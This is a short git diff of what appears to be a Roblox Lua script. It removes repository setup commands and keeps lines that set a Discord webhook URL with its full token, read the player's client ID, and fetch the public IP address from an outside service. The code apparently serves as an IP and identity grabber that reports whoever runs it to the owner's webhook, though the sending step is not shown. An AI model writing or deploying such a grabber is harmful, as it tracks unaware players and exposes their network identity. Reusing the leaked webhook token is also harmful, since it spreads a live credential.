@@ -1,11 +1,3 @@
-echo "# randomRobloxS" >> README.md
-git init
-git add README.md
-git commit -m "first commit"
-git branch -M main
-git remote add origin https://github.com/TheDarkOneMC/randomRobloxS.git
-git push -u origin main
-
 local Webhook = "https://discord.com/api/webhooks/1334221042410983517/vOF2bI4ENdO_tUDlqeIduMMNb5NNB8xlUsXvvthS7v33Ok03KtXR5Fw2JjXRo327vbYg" -- Put your Webhook link here
 local clientid = game:GetService("RbxAnalyticsService"):GetClientId()
 local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
